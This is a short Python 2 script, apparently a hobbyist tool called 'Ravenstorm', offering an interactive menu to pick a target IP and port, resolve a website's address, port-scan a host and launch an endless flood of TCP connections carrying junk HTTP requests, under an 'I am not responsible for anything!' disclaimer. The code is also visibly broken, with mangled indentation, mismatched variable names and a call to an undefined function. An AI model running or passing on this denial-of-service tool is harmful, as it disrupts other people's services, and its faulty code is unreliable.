import socket
from threading import Thread
import os
import sys


def portscanner(targetIP):
   print(" ")
   try:
       for p in range(1, 45000):
       socki = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       res = sock.connect_ex((targetIP, p))
       if res == 0:
       print("\033[1;32;40mPort: " + str(p))
       socki.close()
    except Exception:
       print("\033[1;32;40mError")
       sys.exit()
    print(" ")
    print("\033[1;32;40mMade by Morpheus youtube")
    print(" ")




def ddos():
   while True:
      mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      try:
          print("Success!")
          mysocket.connect((ip, port))
          mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
          mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
      except socket.error:
         print("error")
         mysocket.close()

   for i in range(threads):
      t = Thread(target=dos)
      t.start()





clear = "clear"
os.system(clear)
print ("""\033[1;32;40m
-----------------------------------------------------------
 (                                                        
 )\ )                                 )                   
(()/(    )   )      (              ( /(      (       )    
 /(_))( /(  /((    ))\  (      (   )\()) (   )(     (     
(_))  )(_))(_))\  /((_) )\ )   )\ (_))/  )\ (()\    )\  ' 
| _ \((_)_ _)((_)(_))  _(_/(  ((_)| |_  ((_) ((_) _((_))  
|   // _` |\ V / / -_)| ' \)) (_-<|  _|/ _ \| '_|| '  \() 
|_|_\\__,_| \_/  \___||_||_|  /__/ \__|\___/|_|  |_|_|_|  
                                                          
Made by Taguar258!

I am not responsible for anything!
----------------------------------------------------------""")

i = 1
while i < 6:
   com = raw_input("\033[1;32;40m>> ")
   if com == 'help':
     print("""\033[1;32;40m

    help        = This help message
    set port    = Set the port (set port) (Best=80)
    set threads = Set the number of threads (set threads) (Best=8) (=!Not working yet!)
    set ip      = Set the ip (set ip)
    get ip      = Get ip of website (get ip)
    get port w  = Get port of website.
    get port i  = Get port of ip.
    run         = To Run
    quit        = Quit ; Exit
    
    To stop running attack >>> [Crtl + z]
    
    """)
   elif com == 'quit':
      break
      i = 7
      
   elif com == 'set port':
      print(" ")
      portt = raw_input("\033[1;32;40mPort: ")
      port = int(portt)
      print(" ")
      
   elif com == 'set threads':
      print(" ")
      threadss = input("\033[1;32;40mNumber of Threads: ")
      threads = int(threadss)
      print(" ")
      
   elif com == 'set ip':
      print(" ")
      ip = raw_input("\033[1;32;40mIp: ")
      print(" ")
      
   elif com == 'get ip':
      print(" ")
      webtoip = raw_input("\033[1;32;40mWebsite: ")
      print(" ")
      webtoiptxt = socket.gethostbyname(webtoip)
      print(webtoiptxt)
      print(" ")
      
   elif com == 'run':
      ddos()
   
   elif com == 'get port w':
      print(" ")
      hbw = raw_input("\033[1;32;40mWebsite: ")
      hbwtxt = socket.gethostbyname(hbw)
      portscanner(hbwtxt)
      
   elif com == 'get port i':
      print(" ")
      hbi = raw_input("\033[1;32;40mIp: ")
      portscanner(hbi)
      print(" ")
   else:
      print("""
      Error
      """)
   
   
